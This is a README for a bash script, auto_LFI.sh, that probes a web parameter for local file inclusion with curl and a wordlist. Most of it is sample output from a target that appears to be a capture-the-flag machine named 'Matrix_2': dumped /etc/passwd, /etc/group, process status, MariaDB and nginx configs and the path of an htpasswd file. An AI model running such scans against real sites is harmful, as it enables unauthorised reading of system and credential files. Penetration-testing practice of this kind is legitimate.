# Description
```
A simple Script tests for LFI (Local File Inclusion) via Curl 
```

## Usage of Auto_LFI
```
1. bash auto_LFI.sh
2. select your list: (recommended) LFI.txt
3. look into result to see the result after its finished 

```

## Requirements
```
Curl
```

## Example 

```
bash auto_LFI.sh
 Target URL: https://example.com/index.php
 List of directories: LFI.txt
 Parameter to test: file

-----------------------

cat result 
usr/bin/php-cgi-q-b/var/run/nginx/php-fastcgi.sock469 (php-cgi) R 410 410 410 0 -1 4194368 208 0 0 0 0 1 0 0 20 0 1 0 670 321667072 2657 18446744073709551615 94665109573632 94665113322724 140723976984528 0 0 0 0 4096 67125760 0 0 0 17 0 0 0 0 0 0 94665115422600 94665115951014 94665132658688 140723976990388 140723976990443 140723976990443 140723976990695 0
Name:	php-cgi
Umask:	0022
State:	R (running)
Tgid:	470
Ngid:	0
Pid:	470
PPid:	410
TracerPid:	0
Uid:	33	33	33	33
Gid:	33	33	33	33
FDSize:	64
Groups:	33 
NStgid:	470
NSpid:	470
NSpgid:	410
NSsid:	410
VmPeak:	  314132 kB
VmSize:	  314128 kB
VmLck:	       0 kB
VmPin:	       0 kB
VmHWM:	   10396 kB
VmRSS:	   10396 kB
RssAnon:	    6444 kB
RssFile:	    3372 kB
RssShmem:	     580 kB
VmData:	    5748 kB
VmStk:	     132 kB
VmExe:	    3664 kB
VmLib:	   59460 kB
VmPTE:	     404 kB
VmPMD:	      16 kB
VmSwap:	       0 kB
HugetlbPages:	       0 kB
Threads:	1
SigQ:	0/3894
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000000001000
SigCgt:	0000000184004200
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
Seccomp:	0
Speculation_Store_Bypass:	thread vulnerable
Cpus_allowed:	1
Cpus_allowed_list:	0
Mems_allowed:	00000000,00000001
Mems_allowed_list:	0
voluntary_ctxt_switches:	70
nonvoluntary_ctxt_switches:	2
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
systemd-timesync:x:101:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:102:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:103:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:104:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
mysql:x:105:107:MySQL Server,,,:/nonexistent:/bin/false
uuidd:x:106:108::/run/uuidd:/bin/false
shellinabox:x:107:109:Shell In A Box,,,:/var/lib/shellinabox:/bin/false
ntp:x:108:111::/home/ntp:/bin/false
stunnel4:x:109:113::/var/run/stunnel4:/bin/false
postfix:x:110:114::/var/spool/postfix:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
n30:x:1000:1000:Neo,,,:/home/n30:/bin/bash
testuser:x:1001:1001::/home/testuser:
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
input:x:101:
systemd-journal:x:102:
systemd-timesync:x:103:
systemd-network:x:104:
systemd-resolve:x:105:
systemd-bus-proxy:x:106:
mysql:x:107:
uuidd:x:108:
shellinabox:x:109:
crontab:x:110:
ntp:x:111:
ssl-cert:x:112:
stunnel4:x:113:
postfix:x:114:
postdrop:x:115:
netdev:x:116:
ssh:x:117:
n30:x:1000:
testuser:x:1001:
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
Debian GNU/Linux 9 \n \l

Debian GNU/Linux 9 \n \l

Debian GNU/Linux 9
Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.130-2 (2018-10-27)
===================================================================================

                                                                                     


Linux Matrix_2 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

===================================================================================

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
input:x:101:
systemd-journal:x:102:
systemd-timesync:x:103:
systemd-network:x:104:
systemd-resolve:x:105:
systemd-bus-proxy:x:106:
mysql:x:107:
uuidd:x:108:
shellinabox:x:109:
crontab:x:110:
ntp:x:111:
ssl-cert:x:112:
stunnel4:x:113:
postfix:x:114:
postdrop:x:115:
netdev:x:116:
ssh:x:117:
n30:x:1000:
testuser:x:1001:
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
127.0.0.1 localhost
127.0.1.1 CCc

#Required for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;

	##
	# Gzip Settings
	##

	gzip on;
	gzip_disable "msie6";

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}


#mail {
#	# See sample authentication script at:
#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#	# auth_http localhost/auth.php;
#	# pop3_capabilities "TOP" "USER";
#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#	server {
#		listen     localhost:110;
#		protocol   pop3;
#		proxy      on;
#	}
# 
#	server {
#		listen     localhost:143;
#		protocol   imap;
#		proxy      on;
#	}
#}
server {
    listen 0.0.0.0:80;
    root /var/www/4cc3ss/;
    index index.html index.php;

    include /etc/nginx/include/php;
}

server {
    listen 1337 ssl;
    root /var/www/;
    index index.html index.php;

auth_basic "Welcome to Matrix 2";
auth_basic_user_file /var/www/p4ss/.htpasswd;

    fastcgi_param HTTPS on;
    include /etc/nginx/include/ssl;
    include /etc/nginx/include/php;
}


